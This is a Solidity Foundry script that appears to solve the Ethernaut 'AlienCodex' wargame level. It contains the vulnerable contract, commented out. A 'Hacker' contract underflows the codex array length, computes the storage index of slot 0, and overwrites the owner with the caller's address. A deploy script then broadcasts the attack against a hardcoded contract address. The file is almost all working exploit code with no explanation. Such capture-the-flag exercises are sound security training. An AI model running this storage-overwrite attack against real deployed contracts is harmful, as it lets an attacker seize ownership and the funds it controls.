// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";


// import '../helpers/Ownable-05.sol';

interface AlienCodex {
  function owner() external pure returns (address);
  function make_contact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

// contract AlienCodex is Ownable {

//   bool public contact;
//   bytes32[] public codex;

//   modifier contacted() {
//     assert(contact);
//     _;
//   }
  
//   function make_contact() public {
//     contact = true;
//   }

//   function record(bytes32 _content) contacted public {
//     codex.push(_content);
//   }

//   function retract() contacted public {
//     codex.length--;
//   }

//   function revise(uint i, bytes32 _content) contacted public {
//     codex[i] = _content;
//   }
// }

contract Hacker {
  function hack(address _alienCodex) public {
    AlienCodex alienCodex = AlienCodex(_alienCodex);
    alienCodex.make_contact();
    alienCodex.retract();
    uint256 h = uint256(keccak256(abi.encode(uint256(1))));
    uint256 i;
    unchecked{
      i -= h;
    }
    alienCodex.revise(i, (bytes32(uint256(uint160(msg.sender)))));
    require(alienCodex.owner() == msg.sender, "failed to hack");
  }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Hacker hacker = new Hacker();
        hacker.hack(0x5c21554D19A77Bdb27dbC0c87983890a507d8B82);
        vm.stopBroadcast();
    }
}